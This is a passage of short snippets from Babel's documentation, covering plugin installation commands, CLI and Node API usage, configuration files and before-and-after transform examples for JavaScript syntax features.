DESCRIPTION: Command line usage of the spread transform plugin using the Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-spread script.js

----------------------------------------

TITLE: Installing Property Mutators Plugin - NPM
DESCRIPTION: Command to install the property mutators transform plugin as a dev dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-property-mutators

----------------------------------------

TITLE: Installing @babel/plugin-syntax-import-source via npm
DESCRIPTION: This command installs the @babel/plugin-syntax-import-source plugin as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-import-source

----------------------------------------

TITLE: Babili minification example
DESCRIPTION: Example of Babili minification input and output.

LANGUAGE: JavaScript
CODE:
class Mangler {
  constructor(program) {
    this.program = program;
  }
}
new Mangler();

LANGUAGE: JavaScript
CODE:
class a{constructor(b){this.program=b}}new a;

----------------------------------------

TITLE: Installing @babel/preset-stage-2 with npm or yarn
DESCRIPTION: Command to install the @babel/preset-stage-2 package as a development dependency using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-stage-2

----------------------------------------

TITLE: Applying Strict Mode Transform with Babel Node API
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-transform-strict-mode plugin programmatically with Babel's Node.js API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-strict-mode"],
});

----------------------------------------

TITLE: Applying import-source syntax plugin using Babel Node API
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-syntax-import-source plugin programmatically with Babel's Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-import-source"]
});

----------------------------------------

TITLE: Installing Babel Plugin for Safari ID Destructuring Collision Bugfix
DESCRIPTION: This snippet shows how to install the Babel plugin using npm or yarn. The plugin is used to rename destructuring parameters to work around a Safari bug affecting versions 10 to 16.2.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-bugfix-safari-id-destructuring-collision-in-function-expression

----------------------------------------

TITLE: Using Babel CLI with Async Do Expressions Plugin
DESCRIPTION: This shell command demonstrates how to use the Babel CLI to transform a JavaScript file using the async do expressions plugin.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-proposal-async-do-expressions script.js

----------------------------------------

TITLE: Configuring Babel ES2015 Preset with Spec Option
DESCRIPTION: Illustrates how to enable the 'spec' option for the ES2015 preset, which adds runtime checks for arrow functions and wraps template literal expressions in String().

LANGUAGE: JavaScript
CODE:
// .babelrc
{
  "presets": [
    ["es2015", { "spec": true }]
  ]
}

----------------------------------------

TITLE: Input Function Example
DESCRIPTION: Shows an example of a simple IIFE (Immediately Invoked Function Expression) before transformation.

LANGUAGE: javascript
CODE:
(function () {
}());

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the regenerator transform plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-regenerator

----------------------------------------

TITLE: Using @babel/plugin-transform-jscript via Node.js API
DESCRIPTION: This JavaScript code shows how to use the @babel/plugin-transform-jscript plugin programmatically with the Babel Core API in a Node.js environment.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-jscript"],
});

----------------------------------------

TITLE: Transforming Regex Intersection in JavaScript
DESCRIPTION: This snippet demonstrates how the plugin transforms a regular expression using intersection with the 'v' flag to an equivalent regex with the 'u' flag.

LANGUAGE: javascript
CODE:
/[\p{ASCII}&&\p{Decimal_Number}]/v;

LANGUAGE: javascript
CODE:
/[0-9]/u;

----------------------------------------

TITLE: Configuring Babel Plugin via Configuration File
DESCRIPTION: JSON configuration for enabling the nullish coalescing operator syntax plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-nullish-coalescing-operator"]
}

----------------------------------------

TITLE: Using via CLI
DESCRIPTION: Command line usage of the plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-proposal-explicit-resource-management script.js

----------------------------------------

TITLE: Node.js CommonJS Transform Output
DESCRIPTION: Generated code for Node.js CommonJS environment

LANGUAGE: javascript
CODE:
"use strict";

const data = JSON.parse(require("fs").readFileSync(require.resolve("./data.json")));

----------------------------------------

TITLE: Configuring babel-preset-env with useBuiltIns
DESCRIPTION: Example configuration for babel-preset-env targeting Chrome 55 with useBuiltIns and webpack 2 settings.

LANGUAGE: JavaScript
CODE:
{
  "presets": [
    ["env", {
      "targets": {
        "chrome": 55
      },
      "modules": false,
      "useBuiltIns": true
    }]
  ]
}

----------------------------------------

TITLE: Printing Babel Effective Configs (PowerShell)
DESCRIPTION: Command to print effective Babel configurations for a specific file in PowerShell environments.

LANGUAGE: powershell
CODE:
$env:BABEL_SHOW_CONFIG_FOR = ".\src\myComponent.jsx"; npm start

----------------------------------------

TITLE: Basic Babel Minify Configuration
DESCRIPTION: Simple configuration to enable minify preset in Babel

LANGUAGE: json
CODE:
{
  "presets": ["minify"]
}

----------------------------------------

TITLE: Using Optional Catch Binding Plugin via Babel CLI
DESCRIPTION: Shell command to use the optional catch binding transform plugin with Babel CLI.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-optional-catch-binding script.js

----------------------------------------

TITLE: Removing Console Statements with Babel Plugin
DESCRIPTION: Demonstrates the effect of the remove-console Babel plugin on JavaScript code containing console statements. The plugin removes all console statements from the code.

LANGUAGE: JavaScript
CODE:
console.log("foo");
console.error("bar");

LANGUAGE: JavaScript
CODE:


----------------------------------------

TITLE: Configuring Webpack for Class Fields Support
DESCRIPTION: Shows how to enable class fields support in older versions of Webpack by manually enabling the acorn-stage3 plugin.

LANGUAGE: javascript
CODE:
const acorn = require(require.resolve("acorn", {
  paths: [require.resolve("webpack")]
}));

acorn.Parser = acorn.Parser.extend(require("acorn-stage3"));

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration to enable the transform-remove-debugger plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["transform-remove-debugger"]
}

----------------------------------------

TITLE: Installing babel-helper-evaluate-path Package
DESCRIPTION: Command to install the babel-helper-evaluate-path package as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install babel-helper-evaluate-path --save-dev

----------------------------------------

TITLE: Babel 6 Plugin API Example
DESCRIPTION: Demonstrates the new, simplified plugin API structure in Babel 6. This updated API reduces confusion and makes plugin development more straightforward.

LANGUAGE: JavaScript
CODE:
export default function({ types: t }) {
  return {
    visitor: { … }
  };
}

----------------------------------------

TITLE: Applying Partial Application Plugin via Node API
DESCRIPTION: JavaScript code to use the partial application plugin programmatically with Babel's Node API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-proposal-partial-application"],
});

----------------------------------------

TITLE: SystemJS Transform Output
DESCRIPTION: Example of how dynamic import is transformed for SystemJS module format

LANGUAGE: javascript
CODE:
System.register([], function (_export, _context) {
  "use strict";

  return {
    setters: [],
    execute: function () {
      _context.import("jquery").then(($) => {});
    }
  };
});

----------------------------------------

TITLE: Template String Usage with Identifier Placeholders
DESCRIPTION: Example showing template usage with UPPERCASE identifier style placeholders

LANGUAGE: javascript
CODE:
const buildRequire = template(`
  var IMPORT_NAME = require(SOURCE);
`);

const ast = buildRequire({
  IMPORT_NAME: t.identifier("myModule"),
  SOURCE: t.stringLiteral("my-module"),
});

----------------------------------------

TITLE: Output Example of proto-to-assign Transformation
DESCRIPTION: This snippet demonstrates the transformed output, replacing __proto__ assignment with a _defaults function call.

LANGUAGE: JavaScript
CODE:
function _defaults(obj, defaults) { ... }

_defaults(bar, foo);

----------------------------------------

TITLE: Installing Babel JSX Syntax Plugin via NPM
DESCRIPTION: Command to install the @babel/plugin-syntax-jsx plugin as a development dependency

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-jsx

----------------------------------------

TITLE: Implementing Throw Expressions Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the throw expressions syntax plugin through Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-throw-expressions"]
});

----------------------------------------

TITLE: Using @babel/plugin-syntax-bigint via Node.js API
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-syntax-bigint plugin with Babel's Node.js API to transform code.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-bigint"],
});

----------------------------------------

TITLE: Optional Catch Binding with Finally Block in JavaScript
DESCRIPTION: This example demonstrates optional catch binding in a try-catch-finally structure, showcasing error handling and cleanup.

LANGUAGE: JavaScript
CODE:
try {
  throw 0;
} catch {
  doSomethingWhichDoesNotCareAboutTheValueThrown();
} finally {
  doSomeCleanup();
}

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the async generator functions transform plugin.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-async-generator-functions

----------------------------------------

TITLE: Using Virtual Methods with Function Bind Syntax in JavaScript
DESCRIPTION: Demonstrates the use of the new :: operator for chaining virtual methods from an iterator library. Compares ES7 syntax with equivalent ES6 code.

LANGUAGE: JavaScript
CODE:
/* ES7 */
import { map, takeWhile, forEach } from "iterlib";

getPlayers()
::map(x => x.character())
::takeWhile(x => x.strength > 100)
::forEach(x => console.log(x));

LANGUAGE: JavaScript
CODE:
/* ES6 */
import { map, takeWhile, forEach } from "iterlib";

let _val;
_val = getPlayers();
_val = map.call(_val, x => x.character());
_val = takeWhile.call(_val, x => x.strength > 100);
_val = forEach.call(_val, x => console.log(x));

----------------------------------------

TITLE: Configuring Babel to Use transform-minify-booleans Plugin
DESCRIPTION: Demonstrates how to add the plugin to a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["transform-minify-booleans"]
}

----------------------------------------

TITLE: Printing Babel Effective Configs (Unix/WSL)
DESCRIPTION: Command to print effective Babel configurations for a specific file in Unix-like environments or Windows Subsystem for Linux (WSL).

LANGUAGE: bash
CODE:
BABEL_SHOW_CONFIG_FOR=./src/myComponent.jsx npm start

----------------------------------------

TITLE: Applying @babel/preset-stage-0 using Babel Node API
DESCRIPTION: JavaScript code to use @babel/preset-stage-0 when transforming code with Babel's Node API. It demonstrates how to include the preset in the transformation options.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  presets: ["@babel/preset-stage-0"]
});

----------------------------------------

TITLE: Output Code with Pure Annotation
DESCRIPTION: Resulting code after applying pure annotation, showing how existing comments are preserved alongside the #__PURE__ annotation.

LANGUAGE: javascript
CODE:
const four = /* #__PURE__ */ /* foo */ add(2, 2);

----------------------------------------

TITLE: Babel Node API Usage
DESCRIPTION: Shows how to use the do expressions plugin programmatically via Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-proposal-do-expressions"]
});

----------------------------------------

TITLE: Using Top-level Await in Babel 7.15.0
DESCRIPTION: Enable parsing for the top-level await Stage 4 proposal by default.

LANGUAGE: JavaScript
CODE:
import db from "db";
await db.connect();

----------------------------------------

TITLE: Parsing import.meta in JavaScript
DESCRIPTION: Demonstrates the usage of import.meta, which is now parsed by default in Babel 7.10.0. The import.meta object contains metadata about the current module.

LANGUAGE: JavaScript
CODE:
console.log(import.meta); // { url: "file:///home/user/my-module.js" }

----------------------------------------

TITLE: Installing @babel/plugin-proposal-partial-application via npm
DESCRIPTION: Command to install the Babel plugin for partial application using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-proposal-partial-application

----------------------------------------

TITLE: Applying SystemJS Transform Plugin via Node API in JavaScript
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-transform-modules-systemjs plugin programmatically with Babel's Node API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-modules-systemjs"],
});

----------------------------------------

TITLE: Configuring Babel to Use transform-minify-booleans Plugin
DESCRIPTION: Demonstrates how to add the plugin to a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["transform-minify-booleans"]
}

----------------------------------------

TITLE: Installing @babel/plugin-syntax-import-meta via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-import-meta plugin using npm as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-import-meta

----------------------------------------

TITLE: Using Throw Expressions Plugin via CLI
DESCRIPTION: Command line interface usage for the throw expressions syntax plugin.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-throw-expressions script.js

----------------------------------------

TITLE: Using babel-plugin-minify-mangle-names via CLI
DESCRIPTION: This shell command demonstrates how to use the plugin with Babel's CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins minify-mangle-names script.js

----------------------------------------

TITLE: Using Path Ancestry Methods in JavaScript
DESCRIPTION: Demonstrates the usage of new path utility methods 'isAncestor' and 'isDescendant' for checking relationships between AST nodes.

LANGUAGE: JavaScript
CODE:
let programPath, numberPath;
traverse(ast, {
  Program(path) { programPath = path; },
  NumberPath(path) { numberPath = path; },
});

programPath.isAncestor(numberPath); // true
numberPath.isDescendant(programPath); // true

----------------------------------------

TITLE: Initializing and Starting Babel Website with Yarn
DESCRIPTION: This shell command sequence navigates to the website directory, installs dependencies using Yarn, and starts the local development server for the Babel project website built with Docusaurus.

LANGUAGE: sh
CODE:
cd website
yarn
yarn start

----------------------------------------

TITLE: Directory Compilation Commands
DESCRIPTION: Commands for compiling entire directories and handling TypeScript files

LANGUAGE: shell
CODE:
npx babel src --out-dir lib

LANGUAGE: shell
CODE:
npx babel src --out-file script-compiled.js

LANGUAGE: shell
CODE:
npx babel src --out-dir lib \
  --extensions .ts,.js,.tsx,.jsx,.cjs,.mjs \
  --presets=@babel/preset-typescript,@babel/preset-env,@babel/preset-react

----------------------------------------

TITLE: Installing @babel/preset-stage-3 via npm
DESCRIPTION: Command to install the @babel/preset-stage-3 package as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/preset-stage-3

----------------------------------------

TITLE: Transforming instanceof Operator - Output Example
DESCRIPTION: Transformed output code showing how the plugin converts instanceof operations to handle Symbol.hasInstance custom implementations.

LANGUAGE: javascript
CODE:
function _instanceof(left, right) {
  if (
    right != null &&
    typeof Symbol !== "undefined" &&
    right[Symbol.hasInstance]
  ) {
    return right[Symbol.hasInstance](left);
  } else {
    return left instanceof right;
  }
}

_instanceof(foo, Bar);

----------------------------------------

TITLE: Legacy API Usage Example
DESCRIPTION: Shows the deprecated single line API usage for backwards compatibility reference.

LANGUAGE: javascript
CODE:
import codeFrame from "@babel/code-frame";

const rawLines = `class Foo {
  constructor()
}`;
const lineNumber = 2;
const colNumber = 16;

const result = codeFrame(rawLines, lineNumber, colNumber, {
  /* options */
});

console.log(result);

----------------------------------------

TITLE: Using Partial Application in Babel 7.4.0
DESCRIPTION: Support for the Partial Application proposal.

LANGUAGE: JavaScript
CODE:
strings.map(parseInt(?));

----------------------------------------

TITLE: Transform Duplicate Keys Example - JavaScript
DESCRIPTION: Demonstrates how the plugin transforms objects with duplicate keys into computed properties.

LANGUAGE: javascript
CODE:
var x = { a: 5, a: 6 };
var y = {
  get a() {},
  set a(x) {},
  a: 3,
};

LANGUAGE: javascript
CODE:
var x = { a: 5, ["a"]: 6 };
var y = {
  get a() {},
  set a(x) {},
  ["a"]: 3,
};

----------------------------------------

TITLE: Using RegExp Set Notation in Babel 7.17.0
DESCRIPTION: Support for the RegExp set notation and properties of strings Stage 2 proposal.

LANGUAGE: JavaScript
CODE:
/[\p{RGI_Emoji}&&[\0-\uFFFF]]/v;

----------------------------------------

TITLE: Class Transformation with Assumptions Option
DESCRIPTION: Shows how Babel's new assumptions option affects class transformation output by enabling the noClassCalls assumption.

LANGUAGE: javascript
CODE:
class Test {
  constructor() {
    this.x = 2;
  }
}

// You can test the thrown error in the console:
// Uncaught TypeError: class constructors must be invoked with 'new'
Test();

LANGUAGE: javascript
CODE:
function _classCallCheck(instance, Constructor) {
  if (!(instance instanceof Constructor)) {
    throw new TypeError("Cannot call a class as a function");
  }
}

let Test = function Test() {
  _classCallCheck(this, Test);

  this.x = 2;
};

// You can test the thrown error in the console:
// Uncaught TypeError: class constructors must be invoked with 'new'
Test();

----------------------------------------

TITLE: Plugin Deoptimization Cases
DESCRIPTION: Shows cases where the plugin falls back to using React.createElement instead of the optimized transformation, specifically when using refs or object rest spread syntax.

LANGUAGE: javascript
CODE:
// The plugin will still use React.createElement when `ref` or `object rest spread` is used
<Foo ref="bar" />
<Foo {...bar} />

----------------------------------------

TITLE: Constant Folding Plugin Example
DESCRIPTION: Demonstration of the babel-plugin-minify-constant-folding plugin which evaluates and inlines expressions.

LANGUAGE: javascript
CODE:
2 * 3;
"b" + a + "c" + "d" + g + z + "f" + "h" + "z"

----------------------------------------

TITLE: Configuring Babel to Use React JSX Compat Plugin
DESCRIPTION: This JSON configuration adds the @babel/plugin-transform-react-jsx-compat plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-react-jsx-compat"]
}

----------------------------------------

TITLE: Configuring Babel to Use proto-to-assign Plugin
DESCRIPTION: This JSON configuration adds the @babel/plugin-transform-proto-to-assign plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-proto-to-assign"]
}

----------------------------------------

TITLE: Installing @babel/plugin-syntax-function-sent via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-function-sent plugin using npm as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-function-sent

----------------------------------------

TITLE: Using Pipeline Operator with @@ Token via Node API
DESCRIPTION: JavaScript code showing how to configure the plugin with @@ topic token using Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: [
    [ "@babel/plugin-syntax-pipeline-operator", { topicToken: "@@" } ],
  ],
});

----------------------------------------

TITLE: Configuring @babel/plugin-syntax-flow in babel.config.json
DESCRIPTION: JSON configuration to enable the @babel/plugin-syntax-flow plugin in a Babel project.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-flow"]
}

----------------------------------------

TITLE: Applying babel-plugin-transform-inline-environment-variables with Node.js API
DESCRIPTION: Demonstrates how to use the plugin programmatically with Babel's Node.js API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["transform-inline-environment-variables"],
});

----------------------------------------

TITLE: Transforming JSX with Source Information
DESCRIPTION: Demonstrates how the plugin transforms a simple JSX tag by adding __source property with file location metadata.

LANGUAGE: jsx
CODE:
<sometag />

LANGUAGE: jsx
CODE:
<sometag __source={ { fileName: 'this/file.js', lineNumber: 10, columnNumber: 1 } } />

----------------------------------------

TITLE: Updating Babel CLI usage for @babel/node
DESCRIPTION: Example of updating Babel CLI usage to use the separate @babel/node package in Babel 7.

LANGUAGE: Shell
CODE:
# install the runtime as a dependency
npm install @babel/runtime
# install the plugin as a devDependency
npm install @babel/plugin-transform-runtime --save-dev

----------------------------------------

TITLE: Using @babel/preset-es2017 via Babel CLI
DESCRIPTION: Shell command to use @babel/preset-es2017 when transpiling a JavaScript file with Babel CLI.

LANGUAGE: shell
CODE:
babel script.js --presets @babel/preset-es2017

----------------------------------------

TITLE: Using @babel/preset-stage-3 via Babel CLI
DESCRIPTION: Shell command to use @babel/preset-stage-3 when transpiling a JavaScript file using the Babel CLI.

LANGUAGE: Shell
CODE:
babel script.js --presets @babel/preset-stage-3

----------------------------------------

TITLE: Using the Babel Plugin via CLI in Shell
DESCRIPTION: This snippet shows how to use the plugin with Babel's command-line interface.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-duplicate-named-capturing-groups-regex script.js

----------------------------------------

TITLE: filterItems Usage Examples
DESCRIPTION: Examples showing how to use filterItems with different compatibility data and target configurations

LANGUAGE: javascript
CODE:
const compatData = {
  "transform-feature-1": {
    chrome: "1",
    firefox: "1",
  },
  "transform-feature-2": {
    chrome: "2",
    firefox: "2",
  },
  "transform-feature-3": {
    chrome: "3",
    firefox: "3",
  },
  "transform-feature-4": {
    chrome: "4",
    firefox: "4",
  },
};

filterItems(compatData, new Set(), new Set(), {
  chrome: 2,
});

filterItems(compatData, new Set(), new Set(), {
  chrome: 2,
  firefox: 1,
});

filterItems(
  compatData,
  new Set(["transform-feature-2"]),
  new Set(["transform-feature-4"]),
  {
    chrome: 2,
  }
);

----------------------------------------

TITLE: Using F# Pipeline Operator in Babel 7.5.0
DESCRIPTION: Support for the F# pipeline operator proposal.

LANGUAGE: JavaScript
CODE:
num |> add(2) |> double

----------------------------------------

TITLE: Using Optional Chaining Assignment in JavaScript
DESCRIPTION: This snippet demonstrates the new Optional Chaining Assignment proposal, allowing optional chaining on the left side of assignments.

LANGUAGE: javascript
CODE:
maybeAnObj?.prop = theValue;

// Equivalent to

if (maybeAnObj != null) maybeAnObj.prop = theValue;

----------------------------------------

TITLE: Using Babel Plugin for WebAssembly Import via Node API in JavaScript
DESCRIPTION: Demonstrates how to use the @babel/plugin-proposal-import-wasm-source plugin programmatically with Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: [
    "@babel/plugin-proposal-import-wasm-source"
  ],
});

----------------------------------------

TITLE: Installing @babel/plugin-transform-react-jsx-self via npm
DESCRIPTION: Command to install the @babel/plugin-transform-react-jsx-self plugin using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-react-jsx-self

----------------------------------------

TITLE: Using the Babel Plugin via Node API in JavaScript
DESCRIPTION: This snippet demonstrates how to use the plugin programmatically with Babel's Node API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-duplicate-named-capturing-groups-regex"],
});

----------------------------------------

TITLE: Installing Babel Export Namespace Plugin via NPM
DESCRIPTION: Command to install the @babel/plugin-syntax-export-namespace-from plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-export-namespace-from

----------------------------------------

TITLE: Configuring Pipeline Operator with ^^ Token
DESCRIPTION: JSON configuration for babel.config.json using the ^^ topic token option.

LANGUAGE: json
CODE:
{
  "plugins": [
    [ "@babel/plugin-syntax-pipeline-operator", { "topicToken": "^^" } ]
  ]
}

----------------------------------------

TITLE: Babelify CLI with Options
DESCRIPTION: Example of passing custom options to Babelify through CLI arguments

LANGUAGE: shell
CODE:
browserify -d -e script.js -t [ babelify --comments false ]

----------------------------------------

TITLE: Using Unicode Sets Regex Syntax Plugin via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the @babel/plugin-syntax-unicode-sets-regex plugin with Babel CLI to transform a JavaScript file.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-unicode-sets-regex script.js

----------------------------------------

TITLE: Updating React preset config in Babel 7
DESCRIPTION: Shows how to update the React preset config to include Flow or TypeScript support separately in Babel 7.

LANGUAGE: JSON
CODE:
{
-  "presets": ["@babel/preset-react"]
+  "presets": ["@babel/preset-react", "@babel/preset-flow"] // parse & remove flow types
+  "presets": ["@babel/preset-react", "@babel/preset-typescript"] // parse & remove typescript types
}

----------------------------------------

TITLE: Installing @babel/preset-es2017 via npm
DESCRIPTION: Command to install the @babel/preset-es2017 package as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-es2017

----------------------------------------

TITLE: Configuring Node.js for Babel Transpilation
DESCRIPTION: Illustrates how to switch from node-jsx to Babel's register hook for transpiling JSX in Node.js environments.

LANGUAGE: JavaScript
CODE:
require('node-jsx').install();

LANGUAGE: JavaScript
CODE:
require('babel/register');

----------------------------------------

TITLE: Configuring Babel for Constants and Block Scoping in .babelrc
DESCRIPTION: Example .babelrc configuration to enable transforms for ES2015 constants and block scoping in Babel.

LANGUAGE: JavaScript
CODE:
{
  "plugins": [
    "check-es2015-constants",
    "transform-es2015-block-scoping"
  ]
}

----------------------------------------

TITLE: Installing Plugin via NPM
DESCRIPTION: Command to install the member expression literals transform plugin as a dev dependency.

LANGUAGE: shell
CODE:
npm install @babel/plugin-transform-member-expression-literals --save-dev

----------------------------------------

TITLE: Installing Babel Plugin for Reserved Words Transformation
DESCRIPTION: This command installs the @babel/plugin-transform-reserved-words plugin as a development dependency using npm or yarn.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-reserved-words

----------------------------------------

TITLE: Using Numeric Separators with Hexadecimal Literals in JavaScript
DESCRIPTION: Demonstrates using numeric separators in hexadecimal numbers for byte-level operations and improved readability.

LANGUAGE: javascript
CODE:
let message = 0xa0_b0_c0;

let a = (message >> 16) & 0xff;
console.log(a.toString(16), a); // a0, 160

let b = (message >> 8) & 0xff;
console.log(b.toString(16), b); // b0, 176

let c = message & 0xff;
console.log(c.toString(16), b); // c0, 192

----------------------------------------

TITLE: Using Private Brand Checks in Babel 7.10.0
DESCRIPTION: Support for the Ergonomic brand checks for Private Fields proposal.

LANGUAGE: JavaScript
CODE:
class Car {
  #plate;
  race(other) {
     if (#plate in other) console.log("Racing against another car!");
  }
}

----------------------------------------

TITLE: Configuring Babel for WebAssembly Source Imports
DESCRIPTION: This JSON configuration snippet shows how to set up Babel to use the WebAssembly source import plugin with specific browser targets.

LANGUAGE: json
CODE:
{
  "targets": ["chrome 90", "firefox 90", "node 20.6"],
  "plugins": ["@babel/plugin-proposal-import-wasm-source"]
}

----------------------------------------

TITLE: Configuring Babel Plugin for WebAssembly Import in JSON
DESCRIPTION: Demonstrates how to add the @babel/plugin-proposal-import-wasm-source plugin to a Babel configuration file.

LANGUAGE: json
CODE:
{
  "plugins": [
    "@babel/plugin-proposal-import-wasm-source"
  ]
}

----------------------------------------

TITLE: Configuring Babel Plugin for Logical Assignment Operators Syntax in babel.config.json
DESCRIPTION: JSON configuration to enable the @babel/plugin-syntax-logical-assignment-operators plugin in a Babel project configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-logical-assignment-operators"]
}

----------------------------------------

TITLE: Installing @babel/plugin-syntax-destructuring-private via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-destructuring-private plugin using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-destructuring-private

----------------------------------------

TITLE: Optional Catch Binding Syntax Example in JavaScript
DESCRIPTION: Demonstrates the syntax for try-catch block without a binding parameter, showing how to handle errors without referencing the error object.

LANGUAGE: javascript
CODE:
try {
  throw 0;
} catch {
  doSomethingWhichDoesNotCareAboutTheValueThrown();
  console.log("Yay, code executes!");
}

----------------------------------------

TITLE: Installing Babel Plugin for Arrow Functions
DESCRIPTION: Command to install the Babel plugin for transforming ES2015 arrow functions using npm.

LANGUAGE: Shell
CODE:
$ npm install --save-dev babel-plugin-transform-es2015-arrow-functions

----------------------------------------

TITLE: Using Babel Numeric Separator Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the numeric separator plugin programmatically via Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-numeric-separator"],
});

----------------------------------------

TITLE: Installing @babel/plugin-transform-optional-catch-binding via npm
DESCRIPTION: Command to install the Babel plugin for optional catch binding transformation using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-optional-catch-binding

----------------------------------------

TITLE: Creating an AnyTypeAnnotation Node
DESCRIPTION: Example of creating an AnyTypeAnnotation node using the t.anyTypeAnnotation() builder function.

LANGUAGE: JavaScript
CODE:
t.anyTypeAnnotation();

----------------------------------------

TITLE: Using Babel ES2015 Preset via Node API
DESCRIPTION: JavaScript code demonstrating how to use @babel/preset-es2015 programmatically through the Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  presets: ["@babel/preset-es2015"]
});

----------------------------------------

TITLE: Configuring Babel Presets in JSON
DESCRIPTION: Shows how to configure Babel to use the ES2015 preset in a JSON configuration file, replacing the previous transformer options in Babel 5.

LANGUAGE: JavaScript
CODE:
{
  "presets": ["es2015"]
}

----------------------------------------

TITLE: Reflect.construct Limitations
DESCRIPTION: Demonstrates the limitations of the plugin when using Reflect.construct with ES5 function classes and newTarget parameter.

LANGUAGE: javascript
CODE:
function Foo() {
  console.log(new.target);
}

// Bar extends Foo in ES5
function Bar() {
  Foo.call(this);
}
Bar.prototype = Object.create(Foo.prototype);
Bar.prototype.constructor = Bar;

// Baz does not extend Foo
function Baz() {}

Reflect.construct(Foo, []); // => Foo (correct)
Reflect.construct(Foo, [], Bar); // => Bar (correct)

Reflect.construct(Bar, []); // => Bar (incorrect, though this is how ES5
// inheritance is commonly implemented.)
Reflect.construct(Foo, [], Baz); // => undefined (incorrect)

----------------------------------------

TITLE: Importing @babel/helper-compilation-targets Functions
DESCRIPTION: Shows how to import the main functions from the helper package

LANGUAGE: javascript
CODE:
import {
  filterItems,
  default as getTargets,
  isRequired,
} from "@babel/helper-compilation-targets";

----------------------------------------

TITLE: Using Import Attributes in Babel 7.22.0
DESCRIPTION: Parsing support for the Stage 3 import attributes proposal, previously known as "import assertions".

LANGUAGE: JavaScript
CODE:
import data from "./data.json" with { type: "json" };

----------------------------------------

TITLE: Demonstrating Private Destructuring in JavaScript
DESCRIPTION: Shows how Babel 7.18.0 transforms private destructuring syntax into compatible JavaScript code. The example illustrates destructuring of private and public class fields.

LANGUAGE: JavaScript
CODE:
class Foo {
  #x = 0;
  y = 0;

  equals(obj) {
    const { #x: x, y: y } = this;

    return (
      x === obj.#x && y === obj.y
    );
  }
}

LANGUAGE: JavaScript
CODE:
class Foo {
  #x = 0;
  y = 0;

